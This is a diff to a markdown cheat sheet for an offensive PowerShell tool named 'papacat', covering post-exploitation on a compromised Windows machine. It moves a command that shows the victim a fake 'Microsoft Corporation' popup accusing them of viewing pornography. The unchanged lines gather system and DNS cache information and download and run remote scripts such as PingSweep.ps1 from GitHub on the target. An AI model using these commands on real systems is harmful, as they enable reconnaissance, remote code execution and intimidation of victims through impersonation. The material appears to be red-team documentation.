@@ -119,6 +119,11 @@ iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e
 
 # papacat at post-exploitation
 
+#### Send one message to target machine {message-box}
+```powershell
+powershell (New-Object -ComObject Wscript.Shell).PopUp("BLOCKED ACCESS TO $Env:COMPUTERNAME' RELATED TO PORNOGRAPHIC`n     SURVEYS PERFORMED DURING WORKING HOURS ..",20,"                              * Microsoft Corporation *",0+0)
+```
+
 #### Retrieve remote system information
 ```powershell
 systeminfo|Out-File systeminfo.log -force;echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo "";Start-Sleep -Seconds 1;Remove-Item systeminfo.log -force
@@ -148,13 +153,6 @@ Get-DnsClientCache|Select-Object Entry,Name,Data|Format-Table -AutoSize;$DnstTab
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1" -outfile "PingSweep.ps1";powershell -file PingSweep.ps1 -Action 'Enum'
 ```
 **remark:** <b><i>PingSweep.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 2\3 minuts for module to finish working.
-
-<br />
-
-#### Send one message to target machine {message-box}
-```powershell
-powershell (New-Object -ComObject Wscript.Shell).PopUp("BLOCKED ACCESS TO $Env:COMPUTERNAME' RELATED TO PORNOGRAPHIC`n     SURVEYS PERFORMED DURING WORKING HOURS ..",20,"                              * Microsoft Corporation *",0+0)
-```
 
 <br />
 
